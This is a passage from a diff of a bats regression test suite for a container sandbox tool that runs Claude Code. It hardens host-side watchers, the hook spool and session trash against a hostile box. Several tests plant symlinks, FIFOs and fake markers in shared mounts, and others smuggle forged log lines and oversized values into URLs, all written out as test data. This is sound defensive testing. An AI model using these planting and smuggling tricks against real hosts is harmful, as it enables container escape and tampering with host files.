@@ -171,31 +171,29 @@ EOF
 # Fix: _hook_bridge_watcher reads the file's current byte size at startup and
 # only tails bytes that appear AFTER that offset.
 #
-# This test verifies the fix structurally (the function body must initialize
-# byte_offset from wc -c BEFORE the tail loop). A behavioral test requires
-# launching a real subshell of the watcher and observing subprocess spawns,
-# which is too fragile for unit testing. End-to-end coverage is in the
-# integration suite.
+# This test used to grep the function body for `byte_offset=... wc -c`. The
+# start offset became a stat in v1.5.4 (a `wc -c <` opened a FIFO the box
+# swapped in), so it now drives the bridge instead: two events from a prior
+# session, one after the start, and only the new one reaches a hook.
 # ─────────────────────────────────────────────────────────────────────────────
 @test "regression v0.6.0: hook bridge skips pre-existing events at startup" {
-  local body
-  body="$(declare -f _hook_bridge_watcher)"
-  [[ -n "$body" ]] || { echo "REGRESSION: _hook_bridge_watcher missing"; return 1; }
-
-  # The function must initialize byte_offset with wc -c BEFORE entering its
-  # tail loop. Anything else means we'd start at 0 and replay old events.
-  echo "$body" | grep -qE 'byte_offset=.*wc -c' || {
-    echo "REGRESSION: _hook_bridge_watcher must initialize byte_offset from wc -c"
-    return 1
-  }
-
-  # Verify wc -c appears BEFORE the `while true` loop
-  local before_loop
-  before_loop="${body%%while true*}"
-  echo "$before_loop" | grep -qE 'byte_offset=' || {
-    echo "REGRESSION: byte_offset must be initialized before the tail loop"
-    return 1
-  }
+  local spool="$TEST_TEMP/hooks-v060/events.jsonl" processed="$TEST_TEMP/processed-v060" bpid i
+  mkdir -p "${spool%/*}"
+  echo '{"hook_event_name":"Stop","_cleat_ts":"old1"}' > "$spool"
+  echo '{"hook_event_name":"Stop","_cleat_ts":"old2"}' >> "$spool"
+  _execute_host_hook_bg() { echo "$1" >> "$processed"; }
+  _hook_bridge_watcher "$spool" "$TEST_TEMP" >/dev/null 2>&1 3>&- &
+  bpid=$!
+  sleep 0.5
+  echo '{"hook_event_name":"Stop","_cleat_ts":"new1"}' >> "$spool"
+  i=0
+  while ! grep -q new1 "$processed" 2>/dev/null && [ "$i" -lt 50 ]; do sleep 0.1; i=$((i + 1)); done
+  kill "$bpid" 2>/dev/null || true
+  wait "$bpid" 2>/dev/null || true
+  run grep -c new1 "$processed"
+  assert_output "1"
+  run grep -c old "$processed"
+  assert_output "0"
 }
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -1172,8 +1170,9 @@ EOF
 # ─────────────────────────────────────────────────────────────────────────────
 # v0.8.0: Per-project history isolation. The base ~/.claude mount shares
 # history.jsonl across all containers, so arrow-up in Claude shows commands
-# from other projects. Fix: overlay history.jsonl with a per-project copy
-# from the same session directory used for projects/-workspace.
+# from other projects. Fix: overlay history.jsonl with a per-project copy,
+# keyed like the session directory used for projects/-workspace. (Since v1.5.4
+# the copy lives in the host-only CLEAT_HISTORY_DIR, not inside that directory.)
 # ─────────────────────────────────────────────────────────────────────────────
 @test "regression v0.8.0: history.jsonl overlay isolates per-project history" {
   mock_docker_images "cleat"
@@ -1188,7 +1187,7 @@ EOF
   run assert_docker_run_has "$cname" "history.jsonl:/home/coder/.claude/history.jsonl"
   assert_success
 
-  # The source must be inside the per-project session dir (not the global one)
+  # The source must be keyed by this project (not the global one)
   local _bn _h project_key
   _bn="$(basename "$TEST_TEMP/project" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9-]/-/g')"
   _h="$(echo -n "$TEST_TEMP/project" | _md5 | head -c 8)"
@@ -3218,6 +3217,10 @@ EOF
   # two markers from two days earlier sitting next to the current one.
   local dir="$TEST_TEMP/clip"
   mkdir -p "$dir"
+  # Since v1.5.4 the markers live in clipwatch/, the host-only sibling of the
+  # clip dir. The sweep still takes the clip dir.
+  local wdir="$TEST_TEMP/clipwatch"
+  mkdir -p "$wdir"
 
   # No background jobs: a child outliving the test makes bats miscount tests.
   # Live pid = this test's own shell. Dead pid = a subshell that has already
@@ -3227,21 +3230,95 @@ EOF
   local dead
   dead="$(sh -c 'echo $$')"
 
-  touch "$dir/.watcher.$live" "$dir/.watcher.$dead" "$dir/.watcher.notanumber"
+  touch "$wdir/.watcher.$live" "$wdir/.watcher.$dead" "$wdir/.watcher.notanumber"
   _sweep_dead_watcher_markers "$dir"
 
-  [ -e "$dir/.watcher.$live" ] || {
+  [ -e "$wdir/.watcher.$live" ] || {
     echo "REGRESSION: swept a LIVE watcher's marker, which would drop .host-ready under a working bridge"; return 1; }
-  [ ! -e "$dir/.watcher.$dead" ] || {
+  [ ! -e "$wdir/.watcher.$dead" ] || {
     echo "REGRESSION: a dead session's marker survived and will latch .host-ready on"; return 1; }
-  [ ! -e "$dir/.watcher.notanumber" ] || {
+  [ ! -e "$wdir/.watcher.notanumber" ] || {
     echo "REGRESSION: a malformed marker survived"; return 1; }
 
   # Last real watcher gone: nothing may remain to hold the latch on.
-  rm -f "$dir/.watcher.$live"
+  rm -f "$wdir/.watcher.$live"
   _sweep_dead_watcher_markers "$dir"
-  run bash -c "ls '$dir'/.watcher.* 2>/dev/null; true"
+  run bash -c "ls '$wdir'/.watcher.* 2>/dev/null; true"
   assert_output ""
+}
+
+# v1.5.4: exec_claude under the binary's own strict mode. test/setup.bash strips
+# line 2 when it sources the CLI, and errexit is the defect these tests guard.
+# `run` puts it in a subshell, so the bats process itself stays lenient. -u is
+# left out on purpose: the smoke test covers it on the real binary.
+_strict_exec_claude() { set -eo pipefail; exec_claude "$@"; }
+
+@test "regression v1.5.4: a directory the box plants in the clip dir cannot end the session before its harvest and reports" {
+  # _cleanup_session ran plain `rm -f` on names the box can shape: the
+  # .clipboard.* glob, both .claim.<pid>.* globs and .host-ready. The clip dir
+  # is the box's read-write /tmp/cleat-clip, and rm -f on a directory exits 1
+  # on GNU and BSD. Under the binary's set -e that ended the CLI at the first
+  # one, and the EXIT trap then died on the same line. Skipped: the terminal
+  # restore, the login harvest, "Session ended" and every session-end report,
+  # including the one that says ~/.claude/.config.json appeared. The
+  # clipclaim/ claim is outside the mount, but a watcher killed between its mv
+  # of a planted directory and the rm -rf leaves exactly this behind.
+  _host_open_cmd() { echo ""; }
+  _wait_for_coder_remap() { true; }
+  _account_sync_out() { echo "HARVEST_RAN"; }
+  local run_dir="$CLEAT_RUN_DIR/test-ctr"
+  docker() {
+    case " $* " in
+      *" exec "*" runuser "*)
+        mkdir -p "$run_dir/clip/.clipboard.planted" "$run_dir/clip/.claim.$$.planted" \
+                 "$run_dir/clipclaim/.claim.$$.planted"
+        rm -f "$run_dir/clip/.host-ready"; mkdir "$run_dir/clip/.host-ready"
+        printf '{}\n' > "$HOME/.claude/.config.json" ;;
+    esac
+    command docker "$@"
+  }
+  run _strict_exec_claude test-ctr --dangerously-skip-permissions
+  assert_success
+  assert_output --partial "HARVEST_RAN"
+  assert_output --partial "Session ended"
+  assert_output --partial "appeared during this session"
+  # No rm diagnostic reaches the terminal. On macOS it carried the box's bytes.
+  # This is also what catches a single removal losing its guard, because the
+  # errexit wrapper absorbs the abort itself.
+  refute_output --partial "rm: "
+}
+
+@test "regression v1.5.4: a teardown step that fails still restores the terminal, harvests the login and reports the session" {
+  # Defence in depth for the test above: the teardown is best-effort, so no
+  # step inside it may decide whether the restore, the harvest and the reports
+  # run. Covers both ways the teardown is reached, the final call and the
+  # TERM/HUP trap (a closed terminal window). errexit stays live inside a trap
+  # action, so a guard at the final call site alone would miss the second.
+  _host_open_cmd() { echo ""; }
+  _wait_for_coder_remap() { true; }
+  _account_sync_out() { echo "HARVEST_RAN"; }
+  _restore_terminal() { echo "RESTORE_TERMINAL_CALLED"; }
+  # The stand-in for any teardown step that fails.
+  _browser_teardown_bridge() { return 1; }
+  run _strict_exec_claude test-ctr --dangerously-skip-permissions
+  assert_success
+  assert_output --partial "RESTORE_TERMINAL_CALLED"
+  assert_output --partial "HARVEST_RAN"
+  assert_output --partial "Session ended"
+
+  # The same step failing inside the TERM trap. $PPID of the child is the shell
+  # running exec_claude, so the signal lands on it mid-exec, as a HUP would.
+  # bash runs the trap once the foreground child has exited.
+  docker() {
+    case " $* " in
+      *" exec "*" runuser "*) sh -c 'kill -TERM $PPID' ;;
+    esac
+    command docker "$@"
+  }
+  run _strict_exec_claude test-ctr --dangerously-skip-permissions
+  assert_success
+  assert_output --partial "HARVEST_RAN"
+  assert_output --partial "Session ended"
 }
 
 @test "regression: a symlinked browser-bridge file is never read through" {
@@ -3497,7 +3574,7 @@ EOF
 
 # ─────────────────────────────────────────────────────────────────────────────
 # Every host-side watcher (clipboard, browser, hook bridge) is backgrounded
-# with its stdout+stderr redirected to a per-box .watcher-log, NOT the
+# with its stdout+stderr redirected to a per-box watcher log, NOT the
 # interactive terminal. Under a heavy multi-agent load the host hits its
 # process cap, and a backgrounded watcher that inherits the terminal's fd 2
 # prints bash's own "fork: Resource temporarily unavailable" straight into the
@@ -3552,7 +3629,8 @@ EOF
 
   # The watcher wrote its stderr to the per-box log: proves it ran AND that the
   # redirect targets a debuggable file, not the terminal and not /dev/null.
-  run grep -q "WATCHER_FD2_SENTINEL" "$clip_dir/.watcher-log"
+  # Since v1.5.4 the log is host-only, beside the clip dir.
+  run grep -q "WATCHER_FD2_SENTINEL" "$HOME/.config/cleat/run/${cname}/logs/watcher.log"
   assert_success
   # ...and it did NOT leak into the caller's fd 2 (the terminal in production).
   run grep -q "WATCHER_FD2_SENTINEL" "$TEST_TEMP/caller-stderr"
@@ -3707,15 +3785,18 @@ EOF
 
   run cat "$TEST_TEMP/fake-rc"
   assert_output "echo original"
-  [ ! -L "$dir/.proxy-log" ] || {
-    echo "REGRESSION: the planted symlink survived"; return 1; }
+  # Since v1.5.4 the log is not in the clip dir at all: the line lands in the
+  # host-only bridge dir, where no link the box plants can redirect it.
+  run grep -c 'opening URL' "$TEST_TEMP/bridge/proxy-log"
+  assert_output "1"
 }
 
 @test "regression v1.5.0: cap watcher log does not truncate a host file through a symlink" {
   local target="$TEST_TEMP/precious-log"
   head -c 1200000 /dev/zero | tr '\0' 'q' > "$target"
   ln -s "$target" "$TEST_TEMP/.watcher-log"
-  run _cap_watcher_log "$TEST_TEMP/.watcher-log"
+  # Every caller passes a claim dir since v1.5.4, so the oversized arm is live.
+  run _cap_watcher_log "$TEST_TEMP/.watcher-log" "$TEST_TEMP/claim"
   assert_success
   local sz; sz="$(wc -c < "$target" | tr -d '[:space:]')"
   [ "$sz" -gt 1000000 ] || {
@@ -3726,11 +3807,14 @@ EOF
   local clip_dir="$TEST_TEMP/clip-hr"; mkdir -p "$clip_dir"
   local target="$TEST_TEMP/hr-target-must-not-exist"
   ln -s "$target" "$clip_dir/.host-ready"
-  _clipboard_watcher "$clip_dir" "cat > /dev/null" >/dev/null 2>&1 &
+  # Since v1.5.4 the sentinel is written inside the box (a docker exec, stubbed
+  # here), so the watcher's readiness step is over once that call is recorded.
+  _clipboard_watcher "$clip_dir" "cat > /dev/null" test-hr150 >/dev/null 2>&1 &
   local pid=$!
   local i
   for i in 1 2 3 4 5 6 7 8 9 10; do
-    [ -f "$clip_dir/.host-ready" ] && [ ! -L "$clip_dir/.host-ready" ] && break
+    [ -e "$target" ] && break
+    grep -q '/tmp/cleat-clip/.host-ready$' "$DOCKER_CALLS" 2>/dev/null && break
     sleep 0.3
   done
   stop_watcher "$pid" "$clip_dir"
@@ -4097,7 +4181,7 @@ _vnext_watch_once() {
   local wpid=$! i=0
   printf '%s' "$1" > "$dir/.browser-open"
   while [ "$i" -lt 100 ]; do
-    grep -q "opening URL\|deferring URL\|$_BROWSER_BLOCKED_MARK" "$dir/.proxy-log" 2>/dev/null && break
+    grep -q "opening URL\|deferring URL\|$_BROWSER_BLOCKED_MARK" "$TEST_TEMP/bridge/proxy-log" 2>/dev/null && break
     sleep 0.1
     i=$((i + 1))
   done
@@ -4111,15 +4195,18 @@ _vnext_watch_once() {
 # the offset guard is under test too.
 _vnext_refuse_during_exec() {
   _T_BW_CLIP="$1"
+  # The watcher's log is the host-only bridge dir beside the clip dir.
+  _T_BW_LOG="$(dirname "$_T_BW_CLIP")/bridge/proxy-log"
+  mkdir -p "$(dirname "$_T_BW_LOG")"
   printf '[browser-watcher 09:00:00] %s origin=old.example.com url=https://old.example.com/oauth/authorize?redirect_uri=http%%3A%%2F%%2Flocalhost%%3A45454%%2Fcb\n' \
-    "$_BROWSER_BLOCKED_MARK" > "$_T_BW_CLIP/.proxy-log"
+    "$_BROWSER_BLOCKED_MARK" > "$_T_BW_LOG"
   docker() {
     case "$*" in
       "exec -it "*)
         printf '%s' "https://auth.example.com/oauth/authorize?client_id=x&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback" > "$_T_BW_CLIP/.browser-open"
         local i=0
         while [ "$i" -lt 100 ]; do
-          grep -q "$_BROWSER_BLOCKED_MARK origin=auth.example.com" "$_T_BW_CLIP/.proxy-log" 2>/dev/null && break
+          grep -q "$_BROWSER_BLOCKED_MARK origin=auth.example.com" "$_T_BW_LOG" 2>/dev/null && break
           sleep 0.1
           i=$((i + 1))
         done ;;
@@ -4167,7 +4254,7 @@ _vnext_refuse_during_exec() {
   # `${l##*origin=}` took a trailing origin= the query chose.
   local u="https://auth.example.com/oauth/authorize?client_id=x&return_url=https://app.example.org/done&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback&origin=evil.example"
   _vnext_watch_once "$u" 1
-  run _maybe_report_blocked_opens "$TEST_TEMP/clip/.proxy-log" 0
+  run _maybe_report_blocked_opens "$TEST_TEMP/bridge/proxy-log" 0
   assert_output --partial "$u"
   assert_output --partial "cleat browser allow auth.example.com"
   refute_output --partial "allow evil.example"
@@ -4180,11 +4267,11 @@ _vnext_refuse_during_exec() {
   # allow line, the second one a command the verb rejects.
   local u
   for u in "https://docs.python.org/3/library/" "http://localhost:3000/"; do
-    rm -rf "$TEST_TEMP/clip"
+    rm -rf "$TEST_TEMP/clip" "$TEST_TEMP/bridge"
     _vnext_watch_once "$u" 0
-    run cat "$TEST_TEMP/clip/.proxy-log"
+    run cat "$TEST_TEMP/bridge/proxy-log"
     assert_output --partial "deferring URL to terminal"
-    run _maybe_report_blocked_opens "$TEST_TEMP/clip/.proxy-log" 0
+    run _maybe_report_blocked_opens "$TEST_TEMP/bridge/proxy-log" 0
     assert_output ""
   done
 }
@@ -4196,9 +4283,9 @@ _vnext_refuse_during_exec() {
   # The forged text is the whole shape the watcher writes, timestamp included,
   # so only an anchor on the line's first byte tells the two apart.
   _vnext_watch_once "https://github.com/x?a=[browser-watcher 00:00:00] ${_BROWSER_BLOCKED_MARK} origin=gh-login.evil.tld url=https://gh-login.evil.tld/" 1
-  run cat "$TEST_TEMP/clip/.proxy-log"
+  run cat "$TEST_TEMP/bridge/proxy-log"
   assert_output --partial "deferring URL to terminal"
-  run _maybe_report_blocked_opens "$TEST_TEMP/clip/.proxy-log" 0
+  run _maybe_report_blocked_opens "$TEST_TEMP/bridge/proxy-log" 0
   assert_success
   assert_output ""
 }
@@ -6915,33 +7002,6 @@ REG
 }
 
 # ─────────────────────────────────────────────────────────────────────────────
-# vNEXT: the hook spool had no bound. The box appends to it through the
-# read-write hooks mount and the bridge only ever read forward, so a box with
-# project hooks queued host disk without limit for as long as it lived. The
-# spool is grown past the cap AFTER the bridge's start pass, so only the
-# per-poll claim can catch it: a spool planted before the start is claimed by
-# the start call and would pass a build with no per-poll call.
-@test "regression vNEXT: the hook spool grew without bound" {
-  _HOOK_SPOOL_MAX=200
-  local spool="$CLEAT_RUN_DIR/box-a/hooks/events.jsonl" bpid i
-  mkdir -p "${spool%/*}"
-  : > "$spool"
-  _hook_bridge_watcher "$spool" "$TEST_TEMP" "box-a" >/dev/null 2>&1 &
-  bpid=$!
-  sleep 0.7
-  # One event past the cap. Its translation is the only work the pass does.
-  printf '{"hook_event_name":"Stop","pad":"%s"}\n' "$(head -c 250 /dev/zero | tr '\0' 'x')" >> "$spool"
-  i=0
-  while [ -e "$spool" ] && [ "$i" -lt 60 ]; do sleep 0.5; i=$((i+1)); done
-  kill "$bpid" 2>/dev/null || true
-  wait "$bpid" 2>/dev/null || true
-  run test -e "$spool"
-  assert_failure
-  run ls -A "$CLEAT_RUN_DIR/box-a/hookclaim"
-  assert_output ""
-}
-
-# ─────────────────────────────────────────────────────────────────────────────
 # vNEXT: the image request channel had no rate cap. _CLIPIMG_MAX_BYTES bounds
 # one image, not how often the box asks, and every request is a host pasteboard
 # read, so a box looping on requests read the host clipboard four times a
@@ -6989,20 +7049,6 @@ REG
 }
 
 # ─────────────────────────────────────────────────────────────────────────────
-# vNEXT: a rotated hook drop log silenced the session-end report. The log
-# rotates past 1 MiB, and the report tailed from an offset captured before the
-# session. A rotation done by the bridge, which runs in the background, never
-# reset that offset, so it pointed past the end of the new file and the drops
-# of the rest of the session were never reported.
-@test "regression vNEXT: a rotated hook drop log silenced the session-end report" {
-  mkdir -p "$CLEAT_STATE_DIR"
-  printf 'now\t%s\tjson\tbox-a\tmd5\t0\ttext\n' "$_HOOK_DROP_MARK" > "$CLEAT_STATE_DIR/hook-drops.log"
-  run _maybe_report_hook_drops "$CLEAT_STATE_DIR/hook-drops.log" 5000 box-a
-  assert_success
-  assert_output --partial "Dropped"
-}
-
-# ─────────────────────────────────────────────────────────────────────────────
 # vNEXT: the image request was claimed by renaming it to `.image-req.claimed`
 # in the box's own read-write clip dir. The box could plant that name as a link
 # to a host directory, and mv then moved the request, a file or a whole tree of
@@ -7030,13 +7076,58 @@ REG
   assert_output ""
 }
 
+# v1.5.4: _is_auth_url_shape caps the ENCODED redirect_uri at 2048 bytes before
+# it decodes it. Nothing tested that cap. It is out of reach through
+# _is_auth_url, whose origin gate refuses a whole URL over 2048 bytes first. The
+# value is a substring of that URL. The watcher reaches it directly: it asks
+# the shape question of a refused origin, and that URL runs to the 8192 bytes
+# the claim reads. %41 pads at three encoded bytes per decoded byte, so the
+# decoded callback stays far under _bridge_url_host's own cap and only the
+# encoded cap can refuse it.
+@test "regression v1.5.4: the auth-shape check caps the encoded redirect_uri at 2048 bytes" {
+  local head="https://sso.example.com/authorize?client_id=x&redirect_uri="
+  local cb="http%3A%2F%2Flocalhost%3A45454%2Fcb%3Fp%3D"
+  local pad; pad="$(printf '%%41%.0s' $(seq 1 668))"
+  local enc="${cb}${pad}AA"
+  # The fixture checks its own size, so an edit to cb cannot move the boundary.
+  run printf '%s' "${#enc}"
+  assert_output "2048"
+  run _is_auth_url_shape "${head}${enc}&scope=a"
+  assert_success
+  # 2049 encoded bytes, 699 decoded.
+  run _is_auth_url_shape "${head}${enc}A&scope=a"
+  assert_failure
+}
+
+# v1.5.4: the same change that moved _bridge_url_host's cap to bytes moved the
+# redirect_uri cap in _is_auth_url_shape too. Only the first had a test.
+# Under the UTF-8 locale a Mac terminal runs in, ${#enc} alone counts characters.
+@test "regression v1.5.4: the auth-shape redirect_uri cap counts bytes, not characters" {
+  local utf8; utf8="$(locale -a 2>/dev/null | grep -iE '\.(utf-?8)$' | head -1 || true)"
+  [ -n "$utf8" ] || skip "no UTF-8 locale available on this host"
+  LC_ALL="$utf8"
+  local head="https://sso.example.com/authorize?client_id=x&redirect_uri="
+  local cb="http%3A%2F%2Flocalhost%3A45454%2Fcb%3Fp%3D"
+  local pad; pad="$(printf '%%41%.0s' $(seq 1 500))"
+  local two three
+  two="$(printf '\303\251%.0s' $(seq 1 200))"
+  three="$(printf '\303\251%.0s' $(seq 1 300))"
+  # 1942 bytes.
+  run _is_auth_url_shape "${head}${cb}${pad}${two}&scope=a"
+  assert_success
+  # 2142 bytes but only 1842 characters. It decodes to 1128 bytes, under
+  # _bridge_url_host's cap, so only the encoded cap refuses it.
+  run _is_auth_url_shape "${head}${cb}${pad}${three}&scope=a"
+  assert_failure
+}
+
 # ─────────────────────────────────────────────────────────────────────────────
-# vNEXT: `cleat session rm` moved a session into <key>/.cleat-trash, inside the
+# v1.5.4: `cleat session rm` moved a session into <key>/.cleat-trash, inside the
 # session dir the box mounts read-write. The box could plant a link at the entry
 # name the delete was about to create (the epoch is predictable, the uuid is
 # known to it), and the delete moved the transcript into whatever host directory
 # the link named. The trash is now host-only, under $CLEAT_CONFIG_DIR.
-@test "regression vNEXT: a session delete followed a link the box planted in its trash" {
+@test "regression v1.5.4: a session delete followed a link the box planted in its trash" {
   local sdir="$HOME/.claude/projects/proj-deadbeef" now i
   local uuid="11111111-1111-2222-3333-444444444444"
   mkdir -p "$sdir/.cleat-trash" "$TEST_TEMP/hostdir"
@@ -7051,4 +7142,2614 @@ REG
   assert_output ""
   run cat "$CLEAT_CONFIG_DIR/session-trash/proj-deadbeef/"*"-${uuid}/${uuid}.jsonl"
   assert_output "transcript"
+}
+
+# v1.5.4: restore checked the session's name and then renamed onto it, inside
+# the session dir the box mounts. A link to a host directory planted at the name
+# between the check and the move made mv move the trashed sidecar into that
+# directory. Restore now names the session DIRECTORY with mv -n, which never
+# descends into a planted final name.
+@test "regression v1.5.4: a session restore moved through a link the box planted at the session name" {
+  local sdir="$HOME/.claude/projects/proj-deadbeef"
+  local uuid="11111111-1111-2222-3333-444444444444"
+  local entry="$CLEAT_CONFIG_DIR/session-trash/proj-deadbeef/100-${uuid}"
+  mkdir -p "$sdir" "$entry/$uuid" "$TEST_TEMP/hostdir"
+  echo "t" > "$entry/${uuid}.jsonl"
+  echo "sidecar" > "$entry/$uuid/marker"
+  # mv stands in for the box winning the window after the check. It plants the
+  # link only when the sidecar moves, so the glob order of the two items does
+  # not decide whether the check before the move already saw it.
+  mv() {
+    case "$* " in
+      *"/$uuid "*) [ -L "$sdir/$uuid" ] || ln -s "$TEST_TEMP/hostdir" "$sdir/$uuid" ;;
+    esac
+    command mv "$@"
+  }
+  run _sessions_restore "$sdir" "$uuid"
+  unset -f mv
+  run ls -A "$TEST_TEMP/hostdir"
+  assert_output ""
+  run cat "$entry/$uuid/marker"
+  assert_output "sidecar"
+}
+
+# v1.5.4: the first trash operation carries an old <key>/.cleat-trash out to the
+# host-only trash. That tree is the box's, so it can be a link to any host
+# directory. The carry-out renames the link and drops it, it never walks it.
+@test "regression v1.5.4: the old in-mount trash was unpacked through a link the box planted" {
+  local sdir="$HOME/.claude/projects/proj-deadbeef"
+  local uuid="11111111-1111-2222-3333-444444444444"
+  mkdir -p "$sdir" "$TEST_TEMP/hostdir/100-${uuid}"
+  echo "not the box's" > "$TEST_TEMP/hostdir/100-${uuid}/${uuid}.jsonl"
+  ln -s "$TEST_TEMP/hostdir" "$sdir/.cleat-trash"
+  run _sessions_trash_count "$sdir"
+  assert_output "0"
+  run cat "$TEST_TEMP/hostdir/100-${uuid}/${uuid}.jsonl"
+  assert_output "not the box's"
+  run test -e "$CLEAT_CONFIG_DIR/session-trash/proj-deadbeef/100-${uuid}"
+  assert_failure
+  run test -L "$sdir/.cleat-trash"
+  assert_failure
+}
+
+# v1.5.4: a delete created its trash entry with mkdir -p, which walks through a
+# link to a directory. A link can still reach the host-only trash under an entry
+# name (a box descriptor held across the carry-out of an old trash), and the
+# delete then moved the transcript through it. The entry is now created with a
+# plain mkdir, so an existing name refuses the delete and nothing moves.
+@test "regression v1.5.4: a session delete wrote through a link already at its trash entry name" {
+  local sdir="$HOME/.claude/projects/proj-deadbeef" now i
+  local uuid="11111111-1111-2222-3333-444444444444"
+  local trash="$CLEAT_CONFIG_DIR/session-trash/proj-deadbeef"
+  mkdir -p "$sdir" "$trash" "$TEST_TEMP/hostdir"
+  echo "transcript" > "$sdir/${uuid}.jsonl"
+  now="$(date +%s)"
+  for i in 0 1 2 3 4 5; do
+    ln -s "$TEST_TEMP/hostdir" "$trash/$(( now + i ))-${uuid}"
+  done
+  run _sessions_trash "$sdir" "$uuid" "$TEST_TEMP/proj" "cleat-x"
+  assert_failure 2
+  run ls -A "$TEST_TEMP/hostdir"
+  assert_output ""
+  run cat "$sdir/${uuid}.jsonl"
+  assert_output "transcript"
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: the hook bridge's liveness marker lived in hooks/, the box's own
+# read-write mount, and the reader trusted any regular .bridge.<pid> there that
+# named a live pid. A marker the box planted made every session believe a bridge
+# was already running, so no bridge started and no host hook ever ran while the
+# summary still listed the cap. The markers now live in the host-only
+# hookbridge/ beside it.
+@test "regression v1.5.4: a bridge marker the box planted in its hooks mount stood the hook bridge down" {
+  command -v jq >/dev/null 2>&1 || skip "the bridge branch needs jq on the host"
+  echo '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"true"}]}]}}' > "$HOME/.claude/settings.json"
+  ACTIVE_CAPS=(hooks)
+  _host_open_cmd() { echo ""; }
+  local cname="test-planted-mark" rec="$TEST_TEMP/bridge_started"
+  mkdir -p "$CLEAT_RUN_DIR/$cname/hooks"
+  # The test's own pid, which is alive, as the box would name any live pid.
+  : > "$CLEAT_RUN_DIR/$cname/hooks/.bridge.$$"
+  # The bridge is spawned in the background, so it leaves a record and
+  # exec_claude is held at the next step until the record exists. Bounded, so a
+  # bridge that never spawns fails rather than hangs.
+  _hook_bridge_watcher() { : > "$rec"; }
+  _wait_for_coder_remap() {
+    local i=0
+    while [ ! -f "$rec" ] && [ "$i" -lt 50 ]; do sleep 0.1; i=$((i + 1)); done
+  }
+  run exec_claude "$cname" --dangerously-skip-permissions
+  run test -f "$rec"
+  assert_success
+}
+
+# v1.5.4: the marker was written with a plain redirect into the same read-write
+# mount. A dangling link the box left at hooks/.bridge.<pid> made the host
+# create an empty file at a host path the box picked, and a FIFO there hung the
+# session start. The writer now puts the marker in hookbridge/, where the reader
+# looks, and never writes through a name in the box's mount.
+@test "regression v1.5.4: the bridge marker was written through a link the box planted in its hooks mount" {
+  command -v jq >/dev/null 2>&1 || skip "the bridge branch needs jq on the host"
+  echo '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"true"}]}]}}' > "$HOME/.claude/settings.json"
+  ACTIVE_CAPS=(hooks)
+  _host_open_cmd() { echo ""; }
+  local cname="test-marker-link" rec="$TEST_TEMP/bridge_seen"
+  mkdir -p "$CLEAT_RUN_DIR/$cname/hooks" "$TEST_TEMP/outside"
+  ln -s "$TEST_TEMP/outside/made-by-host" "$CLEAT_RUN_DIR/$cname/hooks/.bridge.$$"
+  # What the next terminal on this box would see once this bridge is up.
+  _hook_bridge_watcher() {
+    if _box_hook_bridge_live "$3"; then echo live; else echo absent; fi > "$rec.part"
+    mv "$rec.part" "$rec"
+  }
+  _wait_for_coder_remap() {
+    local i=0
+    while [ ! -f "$rec" ] && [ "$i" -lt 50 ]; do sleep 0.1; i=$((i + 1)); done
+  }
+  run exec_claude "$cname" --dangerously-skip-permissions
+  run test -e "$TEST_TEMP/outside/made-by-host"
+  assert_failure
+  run cat "$rec"
+  assert_output "live"
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: the hook spool had no bound. The box appends to it through the
+# read-write hooks mount and the bridge only ever read forward, so a box with
+# project hooks queued host disk without limit for as long as it lived. The
+# spool is grown past the cap AFTER the bridge's start pass, so only the
+# per-poll claim can catch it: a spool planted before the start is claimed by
+# the start call and would pass a build with no per-poll call.
+@test "regression v1.5.4: the hook spool grew without bound" {
+  _HOOK_SPOOL_MAX=200
+  local spool="$CLEAT_RUN_DIR/box-a/hooks/events.jsonl" bpid i
+  mkdir -p "${spool%/*}"
+  : > "$spool"
+  _hook_bridge_watcher "$spool" "$TEST_TEMP" "box-a" >/dev/null 2>&1 &
+  bpid=$!
+  sleep 0.7
+  # One event past the cap. Its translation is the only work the pass does.
+  printf '{"hook_event_name":"Stop","pad":"%s"}\n' "$(head -c 250 /dev/zero | tr '\0' 'x')" >> "$spool"
+  i=0
+  while [ -e "$spool" ] && [ "$i" -lt 60 ]; do sleep 0.5; i=$((i+1)); done
+  kill "$bpid" 2>/dev/null || true
+  wait "$bpid" 2>/dev/null || true
+  run test -e "$spool"
+  assert_failure
+  run ls -A "$CLEAT_RUN_DIR/box-a/hookclaim"
+  assert_output ""
+}
+
+# v1.5.4: and with no bridge at all (no host hook, no jq, or a shell or login
+# session) nothing read the spool, so it kept every byte the box queued for the
+# life of the box. Every session entry now bounds it: start, resume, claude,
+# shell and login.
+@test "regression v1.5.4: a hooks box with no bridge kept its spool for its whole life" {
+  # The cap is on, a project hook forwards into the spool, the host has no hook
+  # of its own, so no bridge ever starts to read what the box queues.
+  printf '[caps]\nhooks\n' > "$CLEAT_GLOBAL_CONFIG"
+  : > "$HOME/.claude/settings.json"
+  _host_open_cmd() { echo ""; }
+  _HOOK_SPOOL_MAX=100
+  mkdir -p "$TEST_TEMP/project/.claude"
+  printf '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"true"}]}]}}\n' \
+    > "$TEST_TEMP/project/.claude/settings.json"
+  local cname spool
+  cname="$(container_name_for "$TEST_TEMP/project")"
+  mock_docker_ps "$cname"
+  spool="$CLEAT_RUN_DIR/$cname/hooks/events.jsonl"
+  mkdir -p "${spool%/*}"
+  head -c 150 /dev/zero | tr '\0' 'x' > "$spool"
+  run cmd_shell "$TEST_TEMP/project"
+  assert_success
+  assert_output --partial "Discarded"
+  run test -e "$spool"
+  assert_failure
+  run cat "$CLEAT_STATE_DIR/hook-drops.log"
+  assert_output --partial "	spool	$cname	"
+  # The same pass runs at a login and at a Claude session.
+  head -c 150 /dev/zero | tr '\0' 'x' > "$spool"
+  run cmd_login "$TEST_TEMP/project"
+  assert_output --partial "Discarded"
+  run test -e "$spool"
+  assert_failure
+  head -c 150 /dev/zero | tr '\0' 'x' > "$spool"
+  resolve_caps "$TEST_TEMP/project"
+  run exec_claude "$cname" --dangerously-skip-permissions
+  assert_output --partial "Discarded"
+  run test -e "$spool"
+  assert_failure
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: a rotated hook drop log silenced the session-end report. The log
+# rotates past 1 MiB, and the report tailed from an offset captured before the
